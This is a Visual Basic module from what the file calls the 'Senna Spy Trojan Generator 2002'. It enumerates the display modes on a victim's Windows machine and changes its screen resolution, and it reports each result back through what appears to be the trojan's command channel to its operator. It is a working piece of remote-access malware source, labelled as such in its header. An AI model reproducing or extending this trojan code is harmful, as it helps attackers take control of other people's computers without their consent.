Attribute VB_Name = "MONITOR"
' Senna Spy Trojan Generator 2002
' The First Internet-Trojan Generator In The World !

Option Explicit

Const CCHDEVICENAME = 32
Const CCHFORMNAME = 32

Private Type DEVMODE
    dmDeviceName As String * CCHDEVICENAME
    dmSpecVersion As Integer
    dmDriverVersion As Integer
    dmSize As Integer
    dmDriverExtra As Integer
    dmFields As Long
    dmOrientation As Integer
    dmPaperSize As Integer
    dmPaperLength As Integer
    dmPaperWidth As Integer
    dmScale As Integer
    dmCopies As Integer
    dmDefaultSource As Integer
    dmPrintQuality As Integer
    dmColor As Integer
    dmDuplex As Integer
    dmYResolution As Integer
    dmTTOption As Integer
    dmCollate As Integer
    dmFormName As String * CCHFORMNAME
    dmUnusedPadding As Integer
    dmBitsPerPel As Integer
    dmPelsWidth As Long
    dmPelsHeight As Long
    dmDisplayFlags As Long
    dmDisplayFrequency As Long
End Type

Const DM_BITSPERPEL = &H40000
Const DM_PELSWIDTH = &H80000
Const DM_PELSHEIGHT = &H100000

Private Declare Function ChangeDisplaySettings Lib "user32" Alias "ChangeDisplaySettingsA" (lpInitData As DEVMODE, ByVal dwFlags As Long) As Long
Private Declare Function EnumDisplaySettings Lib "user32" Alias "EnumDisplaySettingsA" (ByVal lpszDeviceName As Long, ByVal iModeNum As Long, lpDevMode As DEVMODE) As Long

Const CDS_UPDATEREGISTRY = &H1
Const CDS_TEST = &H2
Const CDS_FULLSCREEN = &H4
Const CDS_GLOBAL = &H8
Const CDS_SET_PRIMARY = &H10
Const CDS_RESET = &H40000000
Const CDS_SETRECT = &H20000000
Const CDS_NORESET = &H10000000

Const DISP_CHANGE_SUCCESSFUL = 0
Const DISP_CHANGE_RESTART = 1
Const DISP_CHANGE_FAILED = -1
Const DISP_CHANGE_BADMODE = -2
Const DISP_CHANGE_NOTUPDATED = -3
Const DISP_CHANGE_BADFLAGS = -4
Const DISP_CHANGE_BADPARAM = -5

Dim D() As DEVMODE, lNumModes As Long

Public Sub IniciaResolucao(Index As Integer)
   Dim l As Long
   Dim lMaxModes As Long

   lMaxModes = 10
   ReDim D(0 To lMaxModes) As DEVMODE

   lNumModes = 0
   l = EnumDisplaySettings(0, lNumModes, D(lNumModes))

   Do
      lNumModes = lNumModes + 1
      If lNumModes > lMaxModes Then
         lMaxModes = lMaxModes + 8
         ReDim Preserve D(0 To lMaxModes) As DEVMODE
      End If

      l = EnumDisplaySettings(0, lNumModes, D(lNumModes))
      If l = 0 Then
         Exit Do
      End If

      FRMMain.SM Index, ANSWER_RESOLUTION & D(lNumModes).dmPelsWidth & "x" & D(lNumModes).dmPelsHeight & "x" & D(lNumModes).dmBitsPerPel
   Loop

   lNumModes = lNumModes - 1
End Sub

Public Sub TrocaResolucao(Index As Integer, x As Long)
   Dim l As Long
   Dim Flags As Long

    D(x).dmFields = DM_BITSPERPEL Or DM_PELSWIDTH Or DM_PELSHEIGHT
    Flags = CDS_UPDATEREGISTRY

    l = ChangeDisplaySettings(D(x), Flags)

    If l = DISP_CHANGE_RESTART Then
       FRMMain.SM Index, ANSWER_OK & "Reset..."
    ElseIf l = DISP_CHANGE_SUCCESSFUL Then
       FRMMain.SM Index, ANSWER_OK & "Resolution Changed"
    Else
       FRMMain.SM Index, ANSWER_INVALID & "Error Change Resolution"
    Endif
End Sub
